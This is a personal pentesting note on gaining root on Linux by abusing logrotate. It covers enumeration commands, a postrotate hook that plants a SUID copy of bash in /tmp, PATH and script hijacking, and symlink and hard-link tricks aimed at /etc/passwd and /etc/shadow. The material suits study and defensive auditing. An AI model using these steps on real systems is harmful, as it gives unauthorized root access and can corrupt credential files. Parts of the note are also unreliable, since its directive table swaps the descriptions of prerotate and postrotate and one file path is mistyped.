---
created: 2025-12-26
sticker: lucide//rotate-cw
---

## Privilege escalation via logrotate

- `logrotate` is installed on **almost every Linux system**.
- It is usually configured to **run periodically as root**, as a Cron job or systemd timer.
- Not only `logrotate` can rename, compress, and delete files, but also:
	- **Create files with arbitrary ownership and permissions**
	- **Execute scripts defined in configuration files** — via `prerotate`, `postrotate`, `firstaction`, and `lastaction` hooks — **as root**

>[!note] To learn more about `logrotate`, how it works and how to configure it for legitimate purposes, see [[logrotate]].

**If you can influence what files `logrotate` operates on or what commands it runs, you can abuse it for privilege escalation.**
## Enumeration

- Check if `logrotate` is installed:

```bash
which logrotate
```

```bash
logrotate --version
```

>[!note] Older versions of `logrotate` are often vulnerable to symlink attacks.

- Check `logrotate` configuration files:

```bash
cat /etc/logrotate.conf
```

```bash
cat /etc/logrotate.d/
```

- Check permissions of `logrotate` configuration files:

```bash
ls -l /etc/logrotate.conf
```

```bash
ls -l /etc/logrotate.d/*
```

- Ask yourself:
	- Are any configs writable?
	- Are any log paths writable?
	- Do scripts reference writable files?

- Don't ignore Cron:

```bash
grep -R logrotate /etc/cron*
```

- systemd timers:

```bash
systemctl list-timers | grep logrotate
```

- If you find anything, check **`logrotate` execution context**:

```bash
ps aux | grep logrotate
```

- Use [`pspy`](https://github.com/DominicBreuker/pspy) to catch short-lived processes:

```bash
./pspy64 -pf -i 1000
```

>[!note] See [[Cron_jobs_privilege_escalation]].

Summary of `logrotate` configuration directives you're interested in:

| Directive                   | Description                                                                      |
| --------------------------- | -------------------------------------------------------------------------------- |
| `create [mode owner group]` | Create new log file with the specified permissions, user owner, and group owner. |
| `postrotate...endscript`    | Pre-rotation commands.                                                           |
| `prerotate...endscript`     | Post-rotation commands.                                                          |
| `firstaction...endscript`   | Commands to run once before any logs are rotated.                                |
| `lastaction...endscript`    | Commands to run once after all logs are rotated.                                 |
| `sharedscripts`             | Run scripts once per set of logs, not per log.                                   |
| `include <files>`           | Loads files in the specified directory as part of the configuration.             |
| `su <user> <group>`         | Rotate logs as a specific user/group.                                            |
| `allowhardlink`             | Allow rotation of hard-linked files.                                             |
| `noallowhardlink`           | Default behavior; doesn't rotate hard-linked files (safer).                      |
>[!important] If `su` is missing, **scripts run as root**. 

>[!important] By default, commands defined in `prerotate`/`postrotate`/`firstaction`/`lastaction` hooks **run as root**.

## Writable `logrotate` configuration

If you can modify `logrotate` configuration files, you can add arbitrary commands as `prerotate`/`postrotate`/`firstaction`/`lastaction` hooks. This can be abused for privilege escalation:

```bash
postrotate
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash
endscript
```

>[!tip]+ 
>If there're any `su` directives that make the scripts run as a regular user rather than root, remove them or comment them out.

Wait for the rotation, then run:

```bash
/tmp/rootbash -p
```

## Script abuse 

If you can't modify configuration directly, check if `logrotate` runs any scripts **you can modify**:

```bash
postrotate
    /usr/bin/script.sh
endscript
```

Or commands that resolve via `PATH` (`PATH` hijacking inside `logrotate`):

```
postrotate
    some_command
endscript
```

>[!note] See [[PATH_privilege_escalation]].
## Writable log files and `create` directives

- The `create` directive specifies permissions and ownership to assign to a log file it creates:

```
/var/log/myapp.log {
    create 0644 root root
}
```


If `/myall.log` is writable by your current user, you can **replace the log file with a symlink**:

```bash
rm /var/log/myapp.log
ln -s /etc/passwd /var/log/myapp.log
```

When rotation occurs, `logrotate` may:
- Change ownership or permissions of the target
- Truncate or recreate the file

This can result in:
- Writable `/etc/passwd`
- Root-owned files overwritten or corrupted

> [!important]  Modern `logrotate` mitigates many symlink attacks, but **older versions may still be vulnerable**.

If `allowhardlink` is enabled, and you can create hard links in the target location, you can achieve the same result:

```bash
ln /etc/shadow /var/log/myapp.log
```


